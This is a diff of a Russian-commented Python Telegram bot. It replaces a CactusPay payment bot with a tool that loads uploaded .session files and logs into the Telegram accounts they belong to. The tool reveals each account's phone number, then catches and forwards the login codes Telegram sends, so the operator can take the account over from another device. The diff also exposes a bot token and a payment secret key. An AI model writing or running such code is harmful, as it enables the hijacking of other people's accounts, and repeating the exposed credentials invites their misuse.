@@ -1,94 +1,77 @@
+import os
+import re
 import asyncio
-import uuid
-import aiohttp
-from aiogram import Bot, Dispatcher, F
-from aiogram.filters import CommandStart
-from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
-from aiogram.client.default import DefaultBotProperties
-from aiogram.enums import ParseMode
+from telethon import TelegramClient, events
+from aiogram import Bot, Dispatcher, executor, types
 
-# --- КОНФИГУРАЦИЯ ---
-BOT_TOKEN = "8730929027:AAFvBfgHiDZSpUh1ybh2A5hQXPDdVPWMTxM"  # Токен бота от @BotFather
-CACTUS_TOKEN = "4abbe943eeead14e06bb2821"  # Ваш секретный ключ магазина CactusPay
+# --- ТВОИ ДАННЫЕ (ОБЯЗАТЕЛЬНО) ---
+API_TOKEN = '8730929027:AAFvBfgHiDZSpUh1ybh2A5hQXPDdVPWMTxM'
+API_ID = 1234567  # Получи на my.telegram.org
+API_HASH = 'abcdef12345'  # Получи на my.telegram.org
+ADMIN_ID = 12345678  # Твой ID в телеграм (узнай у @userinfobot)
 
-# Предполагаемый URL для создания платежа.
-# Сверьтесь с вашей документацией, возможно там просто https://lk.cactuspay.pro/api/
-CACTUS_API_URL = "https://lk.cactuspay.pro/api/?method=create"
-# --------------------
-
-bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
-dp = Dispatcher()
+bot = Bot(token=API_TOKEN)
+dp = Dispatcher(bot)
 
 
-@dp.message(CommandStart())
-async def cmd_start(message: Message):
-    await message.answer(
-        "👋 Привет! Я бот для оплаты.\n\n"
-        "Просто отправь мне сумму (числом), на которую хочешь пополнить баланс или совершить покупку."
-    )
+# Функция для работы с аккаунтом из файла
+async def process_account(session_path, message):
+    # 1. Бот "входит" в аккаунт, используя файл
+    client = TelegramClient(session_path, API_ID, API_HASH)
 
-
-@dp.message(F.text)
-async def process_amount(message: Message):
-    # 1. Проверяем, ввел ли пользователь корректное число
     try:
-        amount = float(message.text.replace(",", "."))
-        if amount <= 0:
-            raise ValueError
-    except ValueError:
-        await message.answer("⚠️ Пожалуйста, отправьте корректную сумму (например: 150 или 150.50).")
+        await client.connect()
+
+        if not await client.is_user_authorized():
+            await message.reply("❌ Ошибка: Сессия нерабочая (умерла).")
+            return
+
+        # 2. Бот сам узнает номер телефона этого аккаунта
+        me = await client.get_me()
+        phone = f"+{me.phone}" if me.phone else "Номер скрыт"
+
+        await message.reply(
+            f"✅ Вход выполнен!\n📱 **Номер аккаунта:** `{phone}`\n\nТеперь вводи этот номер в приложении. Как только придет код — я его пришлю.")
+
+        # 3. Бот начинает "слушать" код от Telegram
+        @client.on(events.NewMessage(from_users=777000))
+        async def code_handler(event):
+            # Ищем 5 цифр кода в тексте сообщения
+            code = re.findall(r'\b\d{5}\b', event.message.message)
+            if code:
+                await message.answer(f"🔑 **КОД ПОДТВЕРЖДЕНИЯ: `{code[0]}`**")
+
+        # Держим соединение активным 10 минут, пока ты входишь
+        await asyncio.sleep(600)
+
+    except Exception as e:
+        await message.reply(f"⚠ Ошибка при чтении файла: {e}")
+    finally:
+        await client.disconnect()
+        # Удаляем временный файл после работы
+        if os.path.exists(session_path):
+            os.remove(session_path)
+
+
+# Обработка входящего файла .session
+@dp.message_handler(content_types=['document'])
+async def handle_session_file(message: types.Message):
+    # Только ты можешь кидать файлы боту
+    if message.from_user.id != ADMIN_ID:
         return
 
-    # 2. Генерируем уникальный order_id для нашей системы
-    order_id = str(uuid.uuid4())
+    if message.document.file_name.endswith('.session'):
+        # Скачиваем файл во временную папку
+        path = f"sessions/{message.document.file_name}"
+        await message.document.download(destination_file=path)
 
-    # 3. Подготавливаем данные для CactusPay API
-    payload = {
-        "token": CACTUS_TOKEN,
-        "order_id": order_id,
-        "amount": amount,
-        "description": f"Оплата от пользователя {message.from_user.id}"
-        # "method": "sbp" # Раскомментируйте и укажите метод, если хотите зафиксировать способ оплаты
-    }
-
-    # 4. Отправляем запрос на создание платежа
-    msg = await message.answer("⏳ Создаю ссылку на оплату...")
-
-    async with aiohttp.ClientSession() as session:
-        try:
-            # Используем JSON для отправки данных (или data=payload, если API требует form-data)
-            async with session.post(CACTUS_API_URL, json=payload) as response:
-                result = await response.json()
-
-                # 5. Обрабатываем ответ от API
-                if result.get("status") == "success":
-                    payment_url = result["response"]["url"]
-
-                    # Создаем инлайн-кнопку с ссылкой
-                    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-                        [InlineKeyboardButton(text="💳 Оплатить", url=payment_url)]
-                    ])
-
-                    await msg.edit_text(
-                        f"✅ <b>Счет успешно создан!</b>\n\n"
-                        f"<b>Сумма:</b> {amount} руб.\n"
-                        f"<b>Номер заказа:</b> <code>{order_id}</code>\n\n"
-                        f"Нажмите на кнопку ниже, чтобы перейти к оплате.",
-                        reply_markup=keyboard
-                    )
-                else:
-                    await msg.edit_text(
-                        "❌ Произошла ошибка на стороне платежной системы.\n"
-                        f"Детали: {result.get('message', 'Неизвестная ошибка')}"
-                    )
-        except Exception as e:
-            await msg.edit_text(f"❌ Ошибка соединения с платежным шлюзом: {e}")
+        # Запускаем процесс входа и перехвата кода
+        asyncio.create_task(process_account(path, message))
+    else:
+        await message.reply("Пришли файл формата .session")
 
 
-async def main():
-    print("Бот запущен!")
-    await dp.start_polling(bot)
-
-
-if __name__ == "__main__":
-    asyncio.run(main())
+if __name__ == '__main__':
+    if not os.path.exists("sessions"): os.makedirs("sessions")
+    print("Бот запущен. Отправь ему .session файл.")
+    executor.start_polling(dp, skip_updates=True)
